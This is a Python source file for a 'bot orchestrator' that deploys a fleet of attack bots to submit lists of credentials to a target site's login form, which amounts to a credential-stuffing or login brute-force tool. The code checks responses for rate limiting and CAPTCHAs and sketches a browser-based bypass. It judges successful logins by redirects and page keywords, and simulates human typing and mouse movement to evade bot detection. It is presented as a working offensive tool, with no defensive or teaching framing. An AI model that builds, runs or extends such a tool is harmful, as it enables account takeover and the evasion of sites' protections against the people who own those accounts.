"""
Bot Orchestrator - Manages Distributed Attack Bots
"""

import asyncio
from typing import Dict, List, Any
from dataclasses import dataclass
from datetime import datetime
import random
from colorama import Fore, Style
from tqdm.asyncio import tqdm
import time
from core.network import NetworkClient
from core.browser import BrowserManager

@dataclass
class BotTask:
    """Represents a task for a bot"""
    bot_id: int
    target_url: str
    form_action: str
    method: str
    credentials: Dict[str, str]
    delay: float
    task_id: int

class AttackBot:
    """Individual attack bot using Advanced Network Client"""
    
    def __init__(self, bot_id: int, client: NetworkClient, browser_manager: BrowserManager):
        self.bot_id = bot_id
        self.client = client
        self.browser_manager = browser_manager
        self.requests_sent = 0
        self.successful_attempts = 0
        self.blocked = False
    
    async def execute_task(self, task: BotTask) -> Dict:
        """Execute a single attack task"""
        # Delay for rate limiting
        await asyncio.sleep(task.delay + random.uniform(0, 0.5))
        
        result = {
            'bot_id': self.bot_id,
            'task_id': task.task_id,
            'timestamp': datetime.now().isoformat(),
            'status': 'failed',
            'status_code': None,
            'response_time': 0,
            'blocked': False,
            'captcha': False,
            'bypass_attempt': False
        }
        
        start_time = time.time()
        
        try:
            # Use NetworkClient for request
            response = await self.client.request(
                method=task.method,
                url=task.form_action,
                data=task.credentials,
                timeout=15,
                allow_redirects=True
            )
            
            response_time = time.time() - start_time
            response_text = response.text
            
            result['status_code'] = response.status_code
            result['response_time'] = response_time
            
            # Defense Detection
            if response.status_code == 429 or 'rate limit' in response_text.lower():
                result['blocked'] = True
                self.blocked = True
            
            if 'captcha' in response_text.lower() or 'recaptcha' in response_text.lower():
                result['captcha'] = True
            
            # Hybrid Fallback: Attempt Browser Bypass if Blocked or CAPTCHA
            if (result['blocked'] or result['captcha']) and self.browser_manager:
                result['bypass_attempt'] = True
                # Placeholder for browser interaction
                # In real scenario: await self.browser_manager.solve_captcha(task.form_action)
                pass

            # STRICT Success Heuristics
            # 1. Check for Redirect (often 302/303 -> Dashboard)
            # If historical response was a redirect, and we are now at a different URL
            was_redirected = len(response.history) > 0
            
            # 2. Key Indicators
            success_indicators = ['dashboard', 'welcome', 'logout', 'sign out', 'my profile', 'my account']
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'wrong', 'try again', 
                'error', 'denied', 'not found', 'bad credentials'
            ]
            
            response_lower = response_text.lower()
            has_success_keyword = any(ind in response_lower for ind in success_indicators)
            has_failure_keyword = any(ind in response_lower for ind in failure_indicators)
            
            # 3. Check for Password Field (If present, we are likely still on login page)
            # Simple check first to avoid heavy parsing
            has_password_field = 'type="password"' in response_lower or "type='password'" in response_lower
            
            # Decision Logic
            is_success = False
            
            if has_failure_keyword:
                is_success = False
            elif has_password_field:
                 # If we see a password field, we probably didn't move
                 is_success = False
            elif was_redirected and str(response.url) != str(task.form_action):
                 # Strongest signal: Redirected to a new page
                 is_success = True
            elif has_success_keyword:
                 is_success = True
            
            if is_success:
                result['status'] = 'success'
                self.successful_attempts += 1
            elif result['blocked']:
                result['status'] = 'blocked'
            elif result['captcha']:
                result['status'] = 'captcha'
            else:
                result['status'] = 'failed'
            
            self.requests_sent += 1
                
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
        
    async def type_humanly(self, page, selector: str, text: str):
        """Type text with random delays like a human"""
        try:
            element = page.locator(selector)
            await element.click()
            for char in text:
                delay = random.uniform(0.05, 0.25) # Normal typing speed
                # Occasional long pause (thinking time)
                if random.random() < 0.05:
                    delay += random.uniform(0.3, 0.7)
                
                await page.keyboard.type(char, delay=delay * 1000)
        except Exception:
            # Fallback
            await page.fill(selector, text)

    async def move_mouse_humanly(self, page, start_x, start_y, end_x, end_y):
        """Simulate curved mouse movement (Bezier)"""
        steps = 10
        for i in range(steps):
             # Linear interpolation for now, but with jitter
             t = i / steps
             x = start_x + (end_x - start_x) * t + random.uniform(-5, 5)
             y = start_y + (end_y - start_y) * t + random.uniform(-5, 5)
             await page.mouse.move(x, y)
             await asyncio.sleep(random.uniform(0.01, 0.05))
        await page.mouse.move(end_x, end_y)

    async def perform_human_login(self, url: str, creds: Dict):
        """Perform full human-like login sequence via Browser"""
        page = await self.browser_manager.get_page()
        try:
            await page.goto(url, wait_until='networkidle')
            
            # Find fields (using simple selectors for demo)
            user_field = "input[type='text'], input[type='email']"
            pass_field = "input[type='password']"
            submit_btn = "button[type='submit'], input[type='submit']"
            
            # Human Typing
            await self.type_humanly(page, user_field, creds['username'])
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            await self.type_humanly(page, pass_field, creds['password'])
            await asyncio.sleep(random.uniform(0.5, 1.5))
            
            # Human Mouse Move & Click
            btn = page.locator(submit_btn).first
            box = await btn.bounding_box()
            if box:
                 await self.move_mouse_humanly(page, 0, 0, box['x'] + 10, box['y'] + 10)
                 await btn.click()
            
            await page.wait_for_load_state('networkidle')
            return {'status': 'success' if 'dashboard' in page.url else 'failed'}
            
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
        finally:
            await self.browser_manager.close_page(page)


class BotOrchestrator:
    """Manages fleet of attack bots"""
    
    def __init__(self, attack_strategy: Dict):
        self.strategy = attack_strategy
        self.network_client = NetworkClient() # Shared client manages proxies internally
        self.browser_manager = BrowserManager(headless=True) # Shared browser manager
        self.bots: List[AttackBot] = []
        self.results: List[Dict] = []
        self.active = True
        self.total_requests = 0
        self.successful_attacks = 0
        self.blocked_bots = 0
        self.captcha_encounters = 0
    
    async def deploy_bots(self, credentials: List[Dict], max_credentials: int = None):
        """Deploy and coordinate attack"""
        print(f"\n{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}🤖 DEPLOYING ADVANCED BOT FLEET{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}{'='*70}{Style.RESET_ALL}\n")
        
        # Start shared browser manager
        await self.browser_manager.start()

        bot_config = self.strategy['bot_configuration']
        num_bots = bot_config['total_bots']
        
        if max_credentials:
            credentials = credentials[:max_credentials]
        
        # Initialize bots with shared NetworkClient and BrowserManager
        self.bots = [AttackBot(i, self.network_client, self.browser_manager) for i in range(num_bots)]
            
        # Execute phases
        try:
            for phase_name, phase_info in self.strategy['timing_strategy'].items():
                if not self.active:
                    break
                await self._execute_phase(phase_name, phase_info, credentials)
        finally:
            # Ensure browser manager is closed
            await self.browser_manager.close()
        
        self._print_summary()
    
    async def _execute_phase(self, phase_name: str, phase_info: Dict, credentials: List[Dict]):
        """Execute a single attack phase"""
        # ... (similar logic to original but using self.bots which now use NetworkClient) ...
        # For brevity, reusing the core logic structure
        
        total_bots = len(self.bots)
        # Parse percentage "100%" -> 100
        try:
            pct_str = str(phase_info['bots_active']).replace('%', '')
            bots_active_pct = int(pct_str)
        except:
            bots_active_pct = 100

        num_active_bots = max(1, (total_bots * bots_active_pct) // 100)
        active_bots = self.bots[:num_active_bots]
        
        if not self.strategy['attack_vectors']:
            return
        
        vector = self.strategy['attack_vectors'][0]
        rate_per_min = self.strategy['bot_configuration']['requests_per_bot_per_minute']
        delay = 60.0 / rate_per_min if rate_per_min > 0 else 1.0
        
        tasks = []
        task_id = 0
        
        for i, cred in enumerate(credentials):
            bot = active_bots[i % len(active_bots)]
            task = BotTask(
                bot_id=bot.bot_id,
                target_url=vector['target'],
                form_action=vector['form_action'],
                method=vector['method'],
                credentials=cred,
                delay=delay * (i // len(active_bots)),
                task_id=task_id
            )
            tasks.append(bot.execute_task(task))
            task_id += 1
            
            # Simple duration check
            if (delay * (i // len(active_bots))) > phase_info['duration_seconds']:
                break
                
        print(f"{Fore.CYAN}Executing {len(tasks)} attacks in phase {phase_name}...{Style.RESET_ALL}")
        
        for coro in tqdm(asyncio.as_completed(tasks), total=len(tasks)):
            result = await coro
            self.results.append(result)
            self.total_requests += 1
            
            if result['status'] == 'success':
                self.successful_attacks += 1
                print(f"\n{Fore.GREEN}[!] SUCCESS Found! Bot {result['bot_id']}{Style.RESET_ALL}")
            
            if result.get('blocked'):
                self.blocked_bots += 1

    def _print_summary(self):
        """Print summary"""
        print(f"\n{Fore.CYAN}Total Requests: {self.total_requests}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Success: {self.successful_attacks}{Style.RESET_ALL}")
        print(f"{Fore.RED}Blocked: {self.blocked_bots}{Style.RESET_ALL}")

    def get_results(self) -> List[Dict]:
        return self.results

    def get_summary_stats(self) -> Dict:
         return {
            'total_requests': self.total_requests,
            'successful_attacks': self.successful_attacks,
            'blocked_bots': self.blocked_bots,
            'captcha_encounters': self.captcha_encounters,
            'success_rate': (self.successful_attacks / self.total_requests * 100) if self.total_requests > 0 else 0
        }
